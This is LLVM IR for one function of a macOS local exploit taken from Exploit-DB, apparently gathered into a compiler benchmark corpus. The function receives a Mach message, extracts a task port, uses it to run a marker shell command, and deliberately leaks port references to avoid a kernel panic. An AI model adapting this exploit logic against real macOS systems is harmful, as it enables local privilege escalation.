; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/local/extr_40956.c_service_requests.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/local/extr_40956.c_service_requests.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.service_open_mig = type { %struct.TYPE_3__, %struct.TYPE_4__ }
%struct.TYPE_3__ = type { i32 }
%struct.TYPE_4__ = type { i32, i32 }

@.str = private unnamed_addr constant [23 x i8] c"receiving on port set\0A\00", align 1
@MACH_RCV_MSG = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [33 x i8] c"error receiving on port set: %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [67 x i8] c"got a message on the port set from port: local(0x%x) remote(0x%x)\0A\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"got task port: 0x%x\0A\00", align 1
@.str.4 = private unnamed_addr constant [34 x i8] c"touch /tmp/hello_from_fake_kernel\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"did that work?\0A\00", align 1
@.str.6 = private unnamed_addr constant [43 x i8] c"leaking some refs so we don't kernel panic\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @service_requests(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca %struct.service_open_mig*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i64 4096, i64* %3, align 8
  %9 = load i64, i64* %3, align 8
  %10 = call %struct.service_open_mig* @malloc(i64 %9)
  store %struct.service_open_mig* %10, %struct.service_open_mig** %4, align 8
  %11 = load %struct.service_open_mig*, %struct.service_open_mig** %4, align 8
  %12 = load i64, i64* %3, align 8
  %13 = call i32 @memset(%struct.service_open_mig* %11, i32 0, i64 %12)
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))
  %15 = load %struct.service_open_mig*, %struct.service_open_mig** %4, align 8
  %16 = getelementptr inbounds %struct.service_open_mig, %struct.service_open_mig* %15, i32 0, i32 1
  %17 = load i32, i32* @MACH_RCV_MSG, align 4
  %18 = load i64, i64* %3, align 8
  %19 = load i32, i32* %2, align 4
  %20 = call i64 @mach_msg(%struct.TYPE_4__* %16, i32 %17, i32 0, i64 %18, i32 %19, i32 0, i32 0)
  store i64 %20, i64* %5, align 8
  %21 = load i64, i64* %5, align 8
  %22 = load i64, i64* @KERN_SUCCESS, align 8
  %23 = icmp ne i64 %21, %22
  br i1 %23, label %24, label %28

24:                                               ; preds = %1
  %25 = load i64, i64* %5, align 8
  %26 = call i8* @mach_error_string(i64 %25)
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0), i8* %26)
  br label %61

28:                                               ; preds = %1
  %29 = load %struct.service_open_mig*, %struct.service_open_mig** %4, align 8
  %30 = getelementptr inbounds %struct.service_open_mig, %struct.service_open_mig* %29, i32 0, i32 1
  %31 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  store i32 %32, i32* %6, align 4
  %33 = load %struct.service_open_mig*, %struct.service_open_mig** %4, align 8
  %34 = getelementptr inbounds %struct.service_open_mig, %struct.service_open_mig* %33, i32 0, i32 1
  %35 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  %37 = load %struct.service_open_mig*, %struct.service_open_mig** %4, align 8
  %38 = getelementptr inbounds %struct.service_open_mig, %struct.service_open_mig* %37, i32 0, i32 1
  %39 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %38, i32 0, i32 1
  %40 = load i32, i32* %39, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i64 0, i64 0), i32 %36, i32 %40)
  %42 = load %struct.service_open_mig*, %struct.service_open_mig** %4, align 8
  %43 = getelementptr inbounds %struct.service_open_mig, %struct.service_open_mig* %42, i32 0, i32 0
  %44 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %43, i32 0, i32 0
  %45 = load i32, i32* %44, align 4
  store i32 %45, i32* %7, align 4
  %46 = load i32, i32* %7, align 4
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0), i32 %46)
  %48 = load i32, i32* %7, align 4
  %49 = call i32 @run_command(i32 %48, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0))
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  br label %52

52:                                               ; preds = %58, %28
  %53 = load i32, i32* %8, align 4
  %54 = icmp slt i32 %53, 256
  br i1 %54, label %55, label %61

55:                                               ; preds = %52
  %56 = load i32, i32* %6, align 4
  %57 = call i32 @leak_one_ref_for_receive(i32 %56)
  br label %58

58:                                               ; preds = %55
  %59 = load i32, i32* %8, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %8, align 4
  br label %52

61:                                               ; preds = %24, %52
  ret void
}

declare dso_local %struct.service_open_mig* @malloc(i64) #1

declare dso_local i32 @memset(%struct.service_open_mig*, i32, i64) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @mach_msg(%struct.TYPE_4__*, i32, i32, i64, i32, i32, i32) #1

declare dso_local i8* @mach_error_string(i64) #1

declare dso_local i32 @run_command(i32, i8*) #1

declare dso_local i32 @leak_one_ref_for_receive(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
